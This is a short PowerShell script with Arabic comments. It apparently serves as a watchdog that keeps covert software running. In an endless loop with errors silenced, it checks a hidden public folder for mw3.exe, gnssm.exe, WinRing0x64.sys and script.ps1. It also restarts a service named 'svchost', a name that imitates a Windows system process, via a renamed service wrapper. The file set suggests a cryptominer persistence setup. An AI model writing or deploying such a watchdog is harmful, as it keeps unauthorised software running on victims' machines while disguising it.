# monitor.ps1
$ErrorActionPreference = 'SilentlyContinue'

# مسار المجلد الذي يحتوي الملفات الأساسية
$targetFolder = 'C:\Users\Public\SystemData'

# أسماء الملفات التي يجب التحقق من وجودها
$files = @('mw3.exe','gnssm.exe','WinRing0x64.sys','script.ps1')

# اسم الخدمة الأساسية
$svcName = 'svchost'

# مسار gnssm.exe
$gnssmPath = Join-Path $targetFolder 'gnssm.exe'

while ($true) {
    # تحقق من وجود الملفات الأساسية
    $missing = $files | Where-Object { -not (Test-Path (Join-Path $targetFolder $_)) }
    if ($missing) {
        Write-Host "Missing files detected: $($missing -join ', '). Action required."
        # يمكنك هنا إضافة تنزيل الملفات المفقودة أو إرسال تنبيه
    }

    # تحقق من حالة الخدمة الأساسية وإعادة تشغيلها إذا توقفت
    try {
        $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
        if ($null -eq $svc -or $svc.Status -ne 'Running') {
            Write-Host "$svcName is stopped. Attempting to start via GNSSM..."
            & $gnssmPath start $svcName
        } else {
            Write-Host "$svcName is running normally."
        }
    } catch {
        Write-Host "Error checking or starting service: $_"
    }

    # الانتظار لمدة ساعة قبل الفحص التالي
    Start-Sleep -Seconds 1000
}
